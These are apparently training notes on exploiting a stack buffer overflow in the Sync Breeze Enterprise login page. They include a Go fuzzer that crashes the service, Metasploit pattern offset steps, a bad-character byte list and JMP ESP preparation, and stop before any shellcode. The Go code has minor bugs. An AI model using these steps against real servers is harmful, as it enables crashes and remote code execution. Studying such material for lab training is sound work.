# Buffer Overflow Notes

## Introduction
Fuzzing is a reverse engineering technique used to find places in the code where unhandled input can be provided, leading to an application crash or other behavior which can be further exploited.

## HTTP Fuzzing - SyncBreeze

We open the Sync Breeze Enterprise server on our test machine and navigate to the Sync Breeze web portal:

![sync breeze portal](img/screen1.png)

We attempt to login using invalid credentials and capture the response in wireshark. We analyze the TCP stream and find our login request:

![login](img/screen2.png)
![req](img/screen3.png)

## First Fuzzer POC

The following Go program fuzzes the username parameter of the page by sending an increasingly large payload every iteration until it reaches 2000 bytes of lenght.

```
// SyncBreeze 'username' POST parameter fuzzer
// By disastrpc @ github.com/disastrpc

package fuzz

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const target string = "http://192.168.138.10/login"

func er(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {

	client := http.Client{
		Timeout: 5 * time.Second,
	}

	for S := 100; S < 2000; S += 100 {
		buf := strings.Repeat("A", S)
		fmt.Printf("Injecting buffer of %d bytes\n", S)
		form := url.Values{}
		form.Add("username", buf)
		form.Add("password", "test")

		req, err := http.NewRequest("POST", target, strings.NewReader(form.Encode()))
		er(err)
		req.PostForm = form
		req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
		req.Header.Add("content-Type", "application/x-www-form-urlencoded")
		req.Header.Add("Content-Length", string(len(buf)))
		resp, err := client.Do(req)

		if err != nil {
			fmt.Printf("Crash with buffer of %d bytes\n", len(buf))
			os.Exit(0)
		}
		defer req.Body.Close()

		fmt.Println(resp.Status)
		time.Sleep(time.Second * 1)
	}

}
```

Running the script crashes the application at around 800 bytes.

We can see that the EIP register was overwritten by our A characters:

![eip](img/eip41.png)

## Ways to Control Registers

We know our payload overwrites the EIP register, however, we still don't know the exact location in our buffer where this overwrite occurs. 

One of the method we can use is binary tree analysis, where we recursively split the payload into different letters. We can then pinpoint the exact location depending on what letter overwrites the address.

Another (faster) method is to use a non-repeating sequence of bytes, with enough lenght to crash the application. 

## msf-pattern-create

Using this script developed by Metasploit, we can generate a pattern of a specified length:

```
disastrpc sync_breeze λ msf-pattern_create -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
...
...
Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```

We can use that pattern as the buffer to our poc program:

```
buf := "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa...a0Ba1Ba2Ba3Ba4Ba5Ba"

form := url.Values{}
form.Add("username", buf)
form.Add("password", "test")`
```

After the program is executed the following string overwrites the EIP address:

![eip_over](img/eip_over.png)

The EIP register gets overwritten by the string "B0aB".

## msf-pattern_offset

The script *msf-pattern_offset* finds an offset in bytes where the query supplied can be found on the generated buffer. 
```
disastrpc poc λ msf-pattern_offset -q 42306142 -l 800                        
[*] Exact match at offset 780  
```

In this case the script found the bytes at EIP to be located at offset 780 in our buffer.

## Introducing Shellcode

Now that we control the EIP memory register, we can introduce shellcode which will perform whatever function we decide. Shellcode is a set of assembly instructions which normally execute reverse shells or other functions through our overflow.

In our particular case, the remaining buffer of C's is a good place to write the shellcode to, since we can easily access it after our EIP offset. But due to the size of this buffer being too small to hold any meaningful code, we are able to expand our available space by sending a larger payload, if the conditions of the crash don't change then we have successfully expanded our available memory.

## Bad Characters

Some applications and protocols contain restricted characters which hold special meaning, these characters will often cause issues and can't be included in our shellcode.

In order to find these characters we can send all possible hex characters:

```
buf += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
buf += "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
buf += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
buf += "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
buf += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
buf += "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
buf += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
buf += "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
buf += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
buf += "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
buf += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
buf += "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
buf += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
buf += "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
buf += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
buf += "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

## JMP ESP

One reliable way of pointing the ESP register to our code is by leveraging a JMP ESP instruction already present in the code. But it must fulfill some criteria first:

- Must be static (No ASLR)
- Must not contain bad characters

## Mona.py

The Immunity script Mona.py will allow us to search the address space for a specific instruction, which in this case is JMP ESP.

Start the script by writing *!mona modules*, which will display all loaded modules for the attached program. We can see that the *syncbreeze.exe* has been compiled without any protection measures:

![mods](img/sync_mod.png)

## Writing Instructions w/ NASM_Shell

We can use another tool by the Metasploit team called nasm_shell in order to generate assembly instructions in hexadecimal format.

```
disastrpc sync_breeze λ msf-nasm_shell 
nasm > jmp esp
00000000  FFE4              jmp esp
```



